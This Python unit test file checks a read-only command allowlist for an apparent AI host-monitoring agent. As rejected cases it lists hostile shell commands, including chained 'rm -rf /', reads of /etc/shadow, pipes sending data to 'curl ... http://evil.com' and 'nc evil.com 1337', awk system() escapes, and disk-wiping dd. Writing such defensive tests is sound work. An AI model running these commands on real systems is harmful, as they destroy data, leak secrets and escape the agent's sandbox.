"""Unit tests for Command Allowlist Validator"""

from wheatley.tools.allowlist import is_command_allowed


def test_allowed_basic_commands():
    allowed_cmds = [
        "uptime",
        "free -m",
        "free -h",
        "df -h",
        "top -b -n 1",
        "journalctl -n 50",
        "journalctl -u nginx.service -n 20",
        "systemctl status nginx",
        "systemctl is-active nginx.service",
        "systemctl is-failed nginx",
        "docker ps",
        "docker ps -a --format json",
        'docker ps -a --format "{{json .}}"',
        "docker logs nginx",
        "docker logs --tail 50 webapp",
        "docker inspect webapp",
        "docker stats --no-stream",
        "zpool status",
        "zpool status -x",
        "zpool list",
        "smartctl -H /dev/nvme0n1",
        "smartctl -a /dev/sda",
        "sensors -j",
        "sensors",
        "pvesm status",
        "pvesm list local-lvm",
        "pveversion",
        "uname -a",
        "cat /proc/cpuinfo",
        "cat /proc/meminfo",
        "cat /etc/os-release",
        "ip addr",
        "ip -br addr",
    ]
    for cmd in allowed_cmds:
        ok, reason = is_command_allowed(cmd)
        assert ok, f"Command '{cmd}' should be allowed, got: {reason}"


def test_command_chaining_rejected():
    dangerous_cmds = [
        "uptime; rm -rf /",
        "uptime ; whoami",
        "uptime && cat /etc/shadow",
        "uptime || reboot",
        "uptime &",
        "uptime ;",
    ]
    for cmd in dangerous_cmds:
        ok, reason = is_command_allowed(cmd)
        assert not ok, f"Command '{cmd}' should be rejected"
        assert any(term in reason.lower() for term in ("operator", "forbidden", "empty"))


def test_subshells_and_backticks_rejected():
    injections = [
        "uptime `whoami`",
        "echo $(cat /etc/shadow)",
        "docker ps $(reboot)",
        "uptime ${PATH}",
    ]
    for cmd in injections:
        ok, reason = is_command_allowed(cmd)
        assert not ok, f"Command '{cmd}' should be rejected"
        assert "forbidden" in reason.lower() or "substitution" in reason.lower()


def test_redirections_rejected():
    redirects = [
        "uptime > /tmp/pwn",
        "uptime >> /etc/passwd",
        "cat < /etc/shadow",
        "systemctl status nginx > /tmp/out",
    ]
    for cmd in redirects:
        ok, reason = is_command_allowed(cmd)
        assert not ok, f"Command '{cmd}' should be rejected"
        assert "operator" in reason.lower() or "forbidden" in reason.lower()


def test_safe_pipes_allowed():
    safe_pipes = [
        "docker ps | grep nginx",
        "docker ps -a | grep -i exited",
        "journalctl -n 100 | head -n 20",
        "journalctl -n 100 | tail -n 10 | wc -l",
        "uptime | awk '{print $1}'",
        'docker ps --format "{{json .}}" | jq .Names',
        "pvesm status | column -t",
        "df -h | sort -k 5 -h",
        "free -m | grep Mem | cut -d ' ' -f 2",
    ]
    for cmd in safe_pipes:
        ok, reason = is_command_allowed(cmd)
        assert ok, f"Pipe command '{cmd}' should be allowed, got: {reason}"


def test_dangerous_pipes_rejected():
    bad_pipes = [
        "docker ps | bash",
        "docker ps | sh",
        "uptime | rm -rf /",
        "docker ps | curl -d @- http://evil.com",
        "docker ps | nc evil.com 1337",
        "docker ps | awk 'BEGIN{system(\"reboot\")}'",
    ]
    for cmd in bad_pipes:
        ok, reason = is_command_allowed(cmd)
        assert not ok, f"Dangerous pipe '{cmd}' should be rejected"


def test_non_allowlisted_commands_rejected():
    non_allowlisted = [
        "reboot",
        "shutdown -h now",
        "rm -rf /",
        "dd if=/dev/zero of=/dev/sda",
        "curl http://example.com",
        "wget http://example.com",
        "useradd hacker",
        "systemctl restart nginx",
        "systemctl stop nginx",
        "docker stop nginx",
        "docker rm nginx",
    ]
    for cmd in non_allowlisted:
        ok, reason = is_command_allowed(cmd)
        assert not ok, f"Command '{cmd}' should not be in allowlist"
        assert "not in the read-only allowlist" in reason or "mutating" in reason.lower()


def test_custom_allowlist():
    custom = ["custom_diagnostics*", "my_tool --check"]
    assert is_command_allowed("custom_diagnostics --all", custom)[0]
    assert is_command_allowed("my_tool --check", custom)[0]
    assert not is_command_allowed("uptime", custom)[0]


def test_forbidden_mutating_arguments():
    mutating_commands = [
        "journalctl --vacuum-time=2d",
        "journalctl --vacuum-size=1G",
        "ip route add 10.0.0.0/24 via 192.168.1.1",
        "ip addr del 192.168.1.50/24 dev eth0",
        "smartctl -s off /dev/sda",
        "smartctl --smart=off /dev/sda",
        "sensors -s",
        "systemctl start nginx",
        "systemctl stop nginx",
        "docker run -d nginx",
        "docker rm nginx",
        "docker restart webapp",
        "zpool create testpool /dev/sdb",
        "zpool destroy testpool",
    ]
    for cmd in mutating_commands:
        ok, reason = is_command_allowed(cmd)
        assert not ok, f"Mutating command '{cmd}' must be rejected!"
        assert "mutating" in reason.lower() or "not in the read-only allowlist" in reason.lower()


def test_validate_proposed_pattern():
    from wheatley.tools.allowlist import validate_proposed_pattern

    valid_patterns = [
        "smartctl -a *",
        "smartctl --scan",
        "snapraid status",
        "snapraid status *",
        "systemctl list-timers",
        "docker inspect *",
    ]
    for pat in valid_patterns:
        ok, reason = validate_proposed_pattern(pat)
        assert ok, f"Pattern '{pat}' should be valid, got: {reason}"

    invalid_patterns = [
        "",
        "rm -rf *",
        "dd if=* of=*",
        "chmod 777 *",
        "reboot *",
        "systemctl restart *",
        "docker run *",
        "cat *",  # binary without subcommand + wildcard
        "smartctl *",  # binary without subcommand + wildcard
        "smartctl -a * *",  # multiple wildcards
        "smartctl -a *; rm -rf /",  # operator
        "pct stop *",
        "pct exec *",
        "qm stop *",
        "qm guest *",
        "pvesh create *",
        "reboot",
        "shutdown -h now",
    ]
    for pat in invalid_patterns:
        ok, reason = validate_proposed_pattern(pat)
        assert not ok, f"Pattern '{pat}' must be rejected!"


def test_is_self_guest_targeted():
    from wheatley.tools.allowlist import is_self_guest_targeted

    assert is_self_guest_targeted("pve-node-01/110", "pve-node-01/110", "systemctl stop wheatley")
    assert is_self_guest_targeted("pve-node-01/110", "pve-node-01", "pct stop 110")
    assert is_self_guest_targeted("pve-node-01/110", "pve-node-01", "sudo /usr/sbin/pct restart 110")
    assert is_self_guest_targeted("pve-node-01/110", "pve-node-01", "qm guest exec 110 -- ls")
    assert is_self_guest_targeted("pve-node-01/110", "pve-node-01", "lxc-stop -n 110")
    assert is_self_guest_targeted("pve-node-01/110", "pve-node-01", "pvesh create /nodes/pve-node-01/lxc/110/status/stop")
    assert not is_self_guest_targeted("pve-node-01/110", "pve-node-01", "pct stop 105")
    assert not is_self_guest_targeted("pve-node-01/110", "pve-node-01/105", "systemctl restart nginx")
    # False-positive regression checks: VMID substring inside an IP, larger VMID, or command inside another guest
    assert not is_self_guest_targeted("pve-node-01/110", "pve-node-01", "pct exec 105 -- ping 10.0.0.110")
    assert not is_self_guest_targeted("pve-node-01/110", "pve-node-01", "pct stop 1100")
    assert not is_self_guest_targeted("pve-node-01/110", "pve-node-01", "pct exec 105 -- sleep 110")


def test_awk_pipeline_hardening():
    allowed_awk = [
        "uptime | awk -F: '{print $1}'",
        "uptime | awk -F : -v tag=ok '{print tag, $1}'",
        "df -h | awk '{print $1, $5}'",
    ]
    for cmd in allowed_awk:
        ok, reason = is_command_allowed(cmd)
        assert ok, f"Safe awk pipeline '{cmd}' should be allowed, got: {reason}"

    blocked_awk = [
        "docker ps | awk 'BEGIN{system (\"reboot\")}'",
        "uptime | awk 'BEGIN{print \"id\" | \"sh\"}'",
        "uptime | awk '{print}' /etc/shadow",
        "uptime | awk -f /tmp/evil.awk",
        "uptime | awk -l filefuncs '{print $1}'",
        "uptime | awk --exec /tmp/evil.awk",
    ]
    for cmd in blocked_awk:
        ok, _ = is_command_allowed(cmd)
        assert not ok, f"Dangerous awk pipeline '{cmd}' should be rejected"


def test_find_and_xargs_hardening():
    from wheatley.tools.allowlist import validate_proposed_pattern

    # xargs cannot be added as a persistent allowlist pattern
    for pat in ("xargs echo *", "xargs -n 1"):
        ok, _ = validate_proposed_pattern(pat)
        assert not ok, f"Pattern '{pat}' should be rejected"

    # find execution/mutation flags cannot be proposed in patterns
    for pat in ("find /var/log -exec *", "find /var/log -delete"):
        ok, _ = validate_proposed_pattern(pat)
        assert not ok, f"Pattern '{pat}' should be rejected"

    # Even if a read-only find prefix is custom-allowlisted, dangerous flags remain blocked
    custom = ["find /var/log *"]
    ok, reason = is_command_allowed("find /var/log -name *.log", custom_allowlist=custom)
    assert ok, f"Read-only find should be allowed under custom rule, got: {reason}"

    for bad_find in (
        "find /var/log -exec rm {} +",
        "find /var/log -execdir id +",
        "find /var/log -ok rm {} +",
        "find /var/log -delete",
        "find /var/log -fprintf /tmp/out %p",
    ):
        ok, _ = is_command_allowed(bad_find, custom_allowlist=custom)
        assert not ok, f"Dangerous find '{bad_find}' should be rejected"
